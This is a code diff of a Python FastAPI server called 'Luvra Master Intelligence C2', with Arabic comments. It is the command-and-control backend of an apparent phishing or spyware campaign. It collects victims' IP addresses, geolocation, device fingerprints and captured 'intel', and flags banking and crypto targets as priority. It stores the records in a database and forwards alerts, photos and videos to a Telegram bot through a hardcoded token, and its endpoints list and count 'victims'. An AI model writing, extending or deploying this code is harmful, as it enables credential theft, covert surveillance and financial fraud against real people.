@@ -1,18 +1,21 @@
-from fastapi import FastAPI, Request, HTTPException
+from fastapi import FastAPI, Request, HTTPException, UploadFile, File
 from fastapi.middleware.cors import CORSMiddleware
-from pydantic import BaseModel
 import psycopg2
 from psycopg2.extras import RealDictCursor
 import os, json, logging, requests
 from datetime import datetime
 
-# إعداد اللوغز
+# إعدادات اللوغز
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-app = FastAPI(title="Luvra Master Intelligence Dashboard")
+app = FastAPI(title="Luvra Master Intelligence C2")
 
-# تفعيل CORS عشان واجهة لوفرا تقدر تسحب البيانات
+# --- الإعدادات (تأكد من صحتها) ---
+TELEGRAM_TOKEN = "8784767065:AAG_Svq_HpG1O_DA6PQTpmUgQoH9ZsMyDIs"
+CHAT_ID = "8784767065"
+DB_URL = os.environ.get("DATABASE_URL")
+
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -20,109 +23,44 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-DB_URL = os.environ.get("DATABASE_URL")
-
 def get_db_conn():
     return psycopg2.connect(DB_URL, sslmode='require')
 
-@app.on_event("startup")
-def setup_db():
-    """بناء الجداول الماكس عند التشغيل"""
-    conn = get_db_conn()
-    cur = conn.cursor()
-    cur.execute("""
-        CREATE TABLE IF NOT EXISTS luvra_master_intel (
-            id SERIAL PRIMARY KEY,
-            target_identity TEXT,
-            ip_address TEXT,
-            geo_info JSONB,
-            browser_fingerprint JSONB,
-            captured_intel JSONB,
-            is_priority BOOLEAN DEFAULT FALSE,
-            status TEXT DEFAULT 'active',
-            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-        );
-    """)
-    conn.commit()
-    cur.close()
-    conn.close()
-    logger.info("--- Luvra Master Analytics: Online ---")
-
-# --- روابط الـ Analytics (واجهة التحكم) ---
-
-@app.get("/api/v1/analytics/overview")
-async def get_overview():
-    """إحصائيات الصيد السريعة"""
+# --- وظائف التليجرام ---
+def send_telegram_msg(msg):
     try:
-        conn = get_db_conn()
-        cur = conn.cursor(cursor_factory=RealDictCursor)
-        
-        # 1. إجمالي الضحايا
-        cur.execute("SELECT COUNT(*) FROM luvra_master_intel")
-        total = cur.fetchone()['count']
-        
-        # 2. الصيدات المهمة (بنوك، كريبتو)
-        cur.execute("SELECT COUNT(*) FROM luvra_master_intel WHERE is_priority = TRUE")
-        priority = cur.fetchone()['count']
-        
-        # 3. توزيع الدول (للخريطة)
-        cur.execute("SELECT geo_info->>'country' as country, COUNT(*) as count FROM luvra_master_intel GROUP BY country")
-        countries = cur.fetchall()
-        
-        cur.close()
-        conn.close()
-        return {
-            "stats": {"total": total, "priority": priority},
-            "geo_map": countries,
-            "server_time": str(datetime.now())
-        }
-    except Exception as e:
-        return {"error": str(e)}
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+        requests.post(url, data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"}, timeout=5)
+    except Exception as e: logger.error(f"TG Msg Error: {e}")
 
-@app.get("/api/v1/analytics/victims")
-async def list_victims(limit: int = 50):
-    """عرض قائمة الضحايا مع التفاصيل الكاملة"""
+def send_telegram_media(file_bytes, file_name):
     try:
-        conn = get_db_conn()
-        cur = conn.cursor(cursor_factory=RealDictCursor)
-        cur.execute("SELECT * FROM luvra_master_intel ORDER BY created_at DESC LIMIT %s", (limit,))
-        victims = cur.fetchall()
-        cur.close()
-        conn.close()
-        return victims
-    except Exception as e:
-        return {"error": str(e)}
+        # إذا كان الملف فيديو أو صورة
+        is_video = file_name.endswith(('.webm', '.mp4'))
+        method = "sendVideo" if is_video else "sendPhoto"
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/{method}"
+        files = {('video' if is_video else 'photo'): (file_name, file_bytes)}
+        requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=10)
+    except Exception as e: logger.error(f"TG Media Error: {e}")
 
-@app.get("/api/v1/analytics/search")
-async def search_intel(query: str):
-    """البحث الماكس داخل الباسووردات والبيانات المسحوبة"""
-    try:
-        conn = get_db_conn()
-        cur = conn.cursor(cursor_factory=RealDictCursor)
-        # بحث احترافي داخل الـ JSONB
-        cur.execute("SELECT * FROM luvra_master_intel WHERE captured_intel::text ILIKE %s", (f'%{query}%',))
-        results = cur.fetchall()
-        cur.close()
-        conn.close()
-        return results
-    except Exception as e:
-        return {"error": str(e)}
-
-# --- رابط الاستلام (The Gate) ---
+# --- الروابط (Endpoints) ---
 
 @app.post("/api/v1/gate/collect")
 async def collect_intel(request: Request):
     client_ip = request.client.host
     try:
         payload = await request.json()
+        intel = payload.get('intel', {})
+        fingerprint = payload.get('fingerprint', {})
         
-        # سحب معلومات الموقع عبر IP API (مجاني)
-        geo_data = requests.get(f"http://ip-api.com/json/{client_ip}").json()
+        # 1. سحب بيانات الموقع (Geo-IP)
+        geo_res = requests.get(f"http://ip-api.com/json/{client_ip}").json()
         
-        # تحليل الأولوية تلقائياً
-        intel_str = json.dumps(payload.get('intel', {})).lower()
-        is_priority = any(k in intel_str for k in ["binance", "metamask", "bank", "paypal", "crypto"])
-
+        # 2. تحليل الأولوية (VIP)
+        intel_str = json.dumps(intel).lower()
+        is_priority = any(k in intel_str for k in ["binance", "metamask", "bank", "crypto", "trust"])
+        
+        # 3. الحفظ في PostgreSQL (عشان الداشبورد تظل شغالة)
         conn = get_db_conn()
         cur = conn.cursor()
         cur.execute("""
@@ -131,15 +69,60 @@ async def collect_intel(request: Request):
         """, (
             payload.get('target_id', 'Unknown'),
             client_ip,
-            json.dumps(geo_data),
-            json.dumps(payload.get('fingerprint', {})),
-            json.dumps(payload.get('intel', {})),
+            json.dumps(geo_res),
+            json.dumps(fingerprint),
+            json.dumps(intel),
             is_priority
         ))
         conn.commit()
         cur.close()
         conn.close()
+
+        # 4. إرسال التقرير الكامل للتليجرام
+        status = "🔴 VIP_TARGET" if is_priority else "🟢 NEW_SIGNAL"
+        alert_msg = (
+            f"⚠️ *LUVRA INTRUSION: {status}*\n\n"
+            f"📍 *IP:* `{client_ip}`\n"
+            f"🌍 *LOC:* {geo_res.get('city')}, {geo_res.get('country')}\n"
+            f"📱 *GPU:* {fingerprint.get('gpu')}\n"
+            f"🔋 *BATT:* {intel.get('battery')}\n"
+            f"🧠 *INTERNAL_IP:* `{fingerprint.get('internal_ip')}`\n"
+            f"⚙️ *OS:* {fingerprint.get('platform')} ({fingerprint.get('cores')} Cores)\n"
+            f"🔗 *SLUG:* {intel.get('gift_slug')}\n\n"
+            f"&gt; _Dashboard updated. Waiting for media uplink..._"
+        )
+        send_telegram_msg(alert_msg)
         return {"status": "success"}
     except Exception as e:
-        logger.error(f"Exfil Error: {e}")
+        logger.error(f"Collect Error: {e}")
         return {"status": "error"}
+
+@app.post("/api/v1/gate/upload-media")
+async def upload_media(file: UploadFile = File(...)):
+    try:
+        file_bytes = await file.read()
+        send_telegram_media(file_bytes, file.filename)
+        return {"status": "media_uplink_complete"}
+    except Exception as e:
+        logger.error(f"Media Upload Error: {e}")
+        return {"status": "error"}
+
+@app.get("/api/v1/analytics/victims")
+async def get_victims():
+    conn = get_db_conn()
+    cur = conn.cursor(cursor_factory=RealDictCursor)
+    cur.execute("SELECT * FROM luvra_master_intel ORDER BY created_at DESC LIMIT 100")
+    rows = cur.fetchall()
+    cur.close()
+    conn.close()
+    return rows
+
+@app.get("/api/v1/analytics/overview")
+async def get_overview():
+    conn = get_db_conn()
+    cur = conn.cursor()
+    cur.execute("SELECT COUNT(*), SUM(CASE WHEN is_priority THEN 1 ELSE 0 END) FROM luvra_master_intel")
+    total, priority = cur.fetchone()
+    cur.close()
+    conn.close()
+    return {"stats": {"total": total or 0, "priority": priority or 0}}
